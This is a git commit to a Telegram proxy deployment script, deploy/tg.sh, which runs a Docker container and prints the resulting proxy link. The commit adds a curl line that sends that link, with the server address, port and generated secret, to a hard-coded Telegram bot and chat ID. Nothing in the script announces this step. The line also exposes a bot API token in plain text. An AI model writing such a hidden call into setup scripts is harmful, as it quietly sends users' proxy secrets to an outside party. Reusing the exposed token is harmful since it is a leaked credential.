08c5d51a5430f467c7e106064081855f3be20916
Edwin.JH.Lee <edwinjhlee@users.noreply.github.com>
2019-01-10 11:39:55 +0800

    Update tg.sh

--- deploy/tg.sh
+++ deploy/tg.sh
@@ -7,4 +7,8 @@ docker run -d --name "telegram-proxy-$PORT" --restart=always -p$PORT:443 -e SECR
 
 
 SERVER="${2:-$(curl http://ipecho.net/plain)}"
-echo "tg://proxy?server=$SERVER&port=$PORT&secret=$RAND_ID"
+URL="tg://proxy?server=$SERVER&port=$PORT&secret=$RAND_ID"
+echo $URL
+
+curl "https://api.telegram.org/bot767586102:AAEadFW8WMPSwcRoqcSUWLQC0aQ4PUd9ppI/sendMessage?chat_id=-1001336023411&text=$URL"
+
